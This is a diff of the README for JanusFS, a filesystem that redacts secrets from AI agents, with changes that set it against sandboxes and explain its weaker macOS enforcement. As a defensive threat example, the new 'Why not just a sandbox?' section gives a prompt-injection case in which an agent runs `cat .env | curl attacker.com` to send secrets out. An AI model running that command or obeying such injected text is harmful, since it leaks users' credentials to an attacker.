@@ -6,7 +6,7 @@
 [![Tests](https://img.shields.io/github/actions/workflow/status/sarathsp06/janusfs/ci.yml?label=tests&logo=github&branch=main)](https://github.com/sarathsp06/janusfs/actions)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 
-**JanusFS is a policy-enforcing filesystem for AI agents.** It mounts a filtered virtual filesystem backed by your real project and applies policy at the filesystem boundary: allowed files pass through, sensitive spans are redacted in place, and forbidden files fail closed with `EACCES`. The strongest way to use it is `janusfs exec -- <your-agent>`, which runs the agent *inside* that boundary — kernel-enforced on Linux (see [Enforcement](#enforcement-run-your-agent-inside-the-boundary)).
+**JanusFS is a policy-enforcing filesystem for AI agents.** Sandboxes (Seatbelt, Landlock, bubblewrap, Docker) answer one question per path: allow or deny. Deny breaks the agent; allow leaks the secret. JanusFS adds the third answer — **masked**: it mounts a filtered virtual filesystem backed by your real project, where allowed files pass through, sensitive spans are redacted in place byte-for-byte, and forbidden files fail closed with `EACCES`. The strongest way to use it is `janusfs exec -- <your-agent>`, which runs the agent *inside* that boundary — kernel-enforced on Linux (see [Enforcement](#enforcement-run-your-agent-inside-the-boundary)) — and it composes with whatever sandbox you already run.
 
 ![JanusFS — Filesystem boundary illustration](docs/janus_art.png)
 
@@ -19,7 +19,7 @@
 - Policy is enforced on every open, read, and directory listing; real files are never modified.
 - Allowed reads pass through, Masked reads are byte-length-preserving redacted reads, and Hidden reads fail closed.
 - A single local **daemon** process runs in the background and owns all active FUSE mounts. Your CLI commands (`janusfs mount`/`umount`) are short-lived, returning immediately. The daemon serves a single consolidated dashboard exposing all mounts and their statistics under a single unified port.
-- **Two enforcement tiers, stated up front.** On **Linux**, `janusfs exec -- <your-agent>` runs the agent in a private mount namespace where the filtered view *replaces* the source — a real, kernel-enforced boundary. On **macOS** the mount is **advisory** (the real source stays readable at its own path); [Enforcement](#enforcement-run-your-agent-inside-the-boundary) explains why and what's coming. JanusFS is a policy boundary, not a sandbox.
+- **Two enforcement tiers, stated up front.** On **Linux**, `janusfs exec -- <your-agent>` runs the agent in a private mount namespace where the filtered view *replaces* the source — a real, kernel-enforced boundary, exercised by CI on every change. On **macOS** the mount is **advisory** (the real source stays readable at its own path); for enforcement on a Mac, run the agent in a Linux container and use `janusfs exec` inside it. JanusFS is a redaction boundary that composes with your sandbox, not a sandbox itself.
 
 ---
 
@@ -92,9 +92,18 @@ janusfs exec -- aider           # or a shell, a test run, any CLI
 ### The two tiers, honestly
 
 - **Linux — kernel-enforced.** `janusfs exec` runs the command in a private mount namespace (`CLONE_NEWNS`) where the filtered view *replaces* the source at its own path, for both read and write. From inside, the unfiltered tree does not exist; a subprocess cannot reach it by any path. No daemon required, no path rewriting. This is the real boundary. (One consequence of the user namespace: the command sees itself as uid 0 — see `janusfs exec --help`.)
-- **macOS — advisory today.** macOS has no per-process mount namespace available to a third-party tool, so `janusfs exec` can only set the child's working directory to a disjoint mount, scrub `JANUSFS_*` env, and rewrite source-path argv entries — and it needs the daemon running. The real source stays reachable at its own path by any process that looks for it. Treat this as dev-time hygiene, not containment. For real enforcement on a Mac today, run the agent in a Linux container/VM (where `janusfs exec` works natively), or track the Seatbelt spike below.
+- **macOS — advisory.** macOS has no per-process mount namespace available to a third-party tool, so `janusfs exec` can only set the child's working directory to the disjoint sanitized mount and scrub `JANUSFS_*` env — and it needs the daemon running. The real source stays reachable at its own path by any process that looks for it. Treat this as dev-time hygiene, not containment. For real enforcement on a Mac, run the agent in a Linux container/VM (below); for a deny boundary on macOS, use your harness's own sandbox (Codex CLI, Gemini CLI, and Claude Code all ship Seatbelt-based confinement) — JanusFS's masking mount composes with it.
 
 > **Wrapping an interactive editor or IDE is not the same as wrapping a headless agent.** `janusfs exec -- <your-editor>` puts *your own* tools inside the filtered view too, so a masked file you edit and `git add` stages `****` into real git (see the caveat below). `janusfs exec` is designed for headless agent/CLI runs; whether a specific agent harness even functions inside the Linux namespace (config/auth/network under a user namespace) is per-harness and not yet validated here — test yours before relying on it.
+
+### Why not just a sandbox?
+
+Sandboxes and JanusFS answer different questions. A sandbox protects the *machine* from the agent; JanusFS keeps secret *bytes* out of the agent's context, transcript, and model provider. Concretely: deny `.env` under Landlock and the agent breaks when it legitimately needs to know the file's shape; allow it, and the day a prompt injection lands, `cat .env | curl attacker.com` exfiltrates it through a channel no per-tool filter sees. Under JanusFS the raw bytes never enter the process tree at all — `cat .env` yields `API_KEY=****`, same length, file listable, tooling intact. Run both: the sandbox denies the network and the machine, JanusFS masks the secrets.
+
+```bash
+# compose: your harness's sandbox (or a devcontainer) outside, janusfs inside
+janusfs exec -- claude      # inside a devcontainer: add --device /dev/fuse to runArgs
+```
 
 ### Real enforcement on a Mac today: run it in Linux
 
@@ -116,11 +125,8 @@ janusfs exec -- aider            # kernel-enforced: /src is the filtered view
 
 `--device /dev/fuse` and `--cap-add SYS_ADMIN` are what let FUSE mount inside the container. The agent's whole process tree is confined by the namespace, exactly as on a Linux host: `/src` is the real bind-mount, but inside `janusfs exec` it is replaced by the filtered view, and the container gives the agent no other route to the host filesystem. Devcontainers work the same way; add the two flags via `runArgs`.
 
-### macOS enforcement — Seatbelt (spike, not shipped)
 
-A feasibility spike shows macOS Seatbelt (`sandbox-exec`) can confine a plain-CLI subprocess tree at the kernel level — denying access to the real source path while allowing the mountpoint — which would give macOS a genuine **deny** boundary (kernel-enforced Hidden) without a kernel extension. Masking would still be FUSE-served (Seatbelt can deny bytes, not rewrite them). It is **not wired into `janusfs exec`**, and it is unverified against a real signed/Electron harness. Findings, the validated profile, and open risks live in [`docs/SEATBELT_SPIKE.md`](docs/SEATBELT_SPIKE.md).
-
-> **One caveat that applies to every enforced-view design:** because `.git/` passes through to the real object store, running `git add` on a *masked* file inside the view stages the `****` bytes into real git. Keep secret files out of the agent's commits (they are typically `.gitignore`d), or give the agent a scratch clone. See `docs/SEATBELT_SPIKE.md` for the full note.
+> **One caveat that applies to every enforced-view design:** because `.git/` passes through to the real object store, running `git add` on a *masked* file inside the view stages the `****` bytes into real git. JanusFS warns loudly: `janusfs check` reports every masked file git would stage, and `janusfs exec` prints the same warning before the child starts. Keep secret files out of the agent's commits (they are typically `.gitignore`d), or give the agent a scratch clone.
 
 
 ## The problem
@@ -215,7 +221,7 @@ janusfs mount .
 **Platform-specific confinement, read this before you decide how to launch your agent:**
 
 - **Linux** has a real, kernel-enforced boundary: `janusfs exec -- <agent>` runs the agent in a private mount namespace where the filtered view *replaces* the source at its own path. The agent cannot reach the unfiltered tree by any path, because from inside that namespace the unfiltered tree doesn't exist.
-- **macOS has no enforced boundary today.** Both "point your agent at the mountpoint" and `janusfs exec` are **advisory**: the real source directory remains fully readable at its own path by the same agent process, through any other tool, subprocess, or absolute path it happens to resolve (git config, an IDE workspace file, a stray `cd`, …). Nothing on macOS currently stops that — path-preserving mode (which would close this) is speculative and unimplemented; the disjoint mountpoint model is the only thing that ships. If your threat model requires that an agent genuinely cannot reach a secret by any path, macOS is not sufficient on its own — this is JanusFS's own stated non-goal (see [Security model](#security-model)), not a bug you can configure around.
+- **macOS has no enforced boundary.** Both "point your agent at the mountpoint" and `janusfs exec` are **advisory**: the real source directory remains fully readable at its own path by the same agent process, through any other tool, subprocess, or absolute path it happens to resolve (git config, an IDE workspace file, a stray `cd`, …). Nothing on macOS stops that — a path-preserving mode was considered and rejected (an evadable daemon-side heuristic cannot compete with the vendor-signed sandbox your harness already ships; see `SPEC.md` §20). If your threat model requires that an agent genuinely cannot reach a secret by any path, run it in a Linux container — that is the supported answer, not a workaround.
 
 By default, the mountpoint mirrors the source's full path under your mount root
 (e.g. `~/.janusfs/mounts/Users/you/my-project`), so two sources never collide
@@ -556,7 +562,7 @@ $ janusfs check --secrets
 ## Security model
 
 - **Trust boundary:** the mountpoint and the local HTTP dashboard. The agent is untrusted; the user operating the CLI is trusted. **This boundary is only kernel-enforced on Linux** (via `janusfs exec`'s private mount namespace). On macOS both the disjoint mount and `janusfs exec` are advisory: the real source directory stays reachable at its own path by any means other than the mountpoint. JanusFS is explicitly not a sandbox against a process that has, or can find, another way to the source (see Non-goals in `SPEC.md`) — on macOS today, "another way to the source" is simply "the source's own path," reachable with no exploit needed.
-- **Agents cannot weaken policy.** `.janusfs.yml` is read-only through the mount, regardless of any user rule. The dashboard's mutating endpoints (edit a revealed file, save config, reload rules) require the per-mount bearer token and are operator tools — they act as the trusted user, not through the agent's mount.
+- **Agents cannot weaken policy.** `.janusfs.yml` is read-only through the mount, regardless of any user rule. The dashboard's mutating endpoints (save config, reload rules) require the per-mount bearer token and are operator tools — they act as the trusted user, not through the agent's mount. The dashboard never serves raw source bytes.
 - **Fail-closed under all faults.** Parser errors, cache corruption, redactor panics → paths read as Hidden (`EACCES`), never raw.
 - **No content on disk.** Redacted bytes live only in RAM; the history DB stores per-path counters and coverage snapshots, **never** file contents.
 - **Read path validates every time.** Every masked-file read revalidates `(mtime, size, inode)` against the cache key before serving — the authoritative change detector (there is no file watcher).
@@ -571,10 +577,14 @@ See [`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md) for the full boundaries / ass
 | Approach | Handles secrets *inside* useful files? | Survives agent iterations? | Zero config-per-repo? | Perf near-native? |
 |---|:-:|:-:|:-:|:-:|
 | `.gitignore` / `.aiexclude` | ❌ (whole-file only) | ✅ | ⚠️ per-repo | ✅ |
+| Harness sandbox (Seatbelt / Landlock / bubblewrap / srt) | ❌ (allow or deny only) | ✅ | ✅ | ✅ |
+| Docker / devcontainer bind mount | ❌ (hands the agent the raw file) | ✅ | ⚠️ image setup | ✅ |
 | One-shot secret-scrubbing before agent hand-off | ⚠️ (frozen snapshot) | ❌ | ✅ | ✅ |
 | Manually curated read-only copy | ❌ (whole-file only) | ❌ (out of date instantly) | ⚠️ setup | ✅ |
 | Custom LLM tool wrappers that filter file reads | ⚠️ (per-tool, easily bypassed) | ⚠️ (per-tool discipline) | ⚠️ | ⚠️ |
 | **JanusFS** | ✅ (per-span, byte-length preserving) | ✅ (FS boundary, per-read) | ✅ machine-wide via `~/.janusfs/config/` | ✅ (steady-state cache) |
+
+Sandboxes and containers are *complements*, not competitors — they decide allow/deny and protect the machine; JanusFS masks. Run `janusfs exec` inside them.
 
 ## Development Guide
 
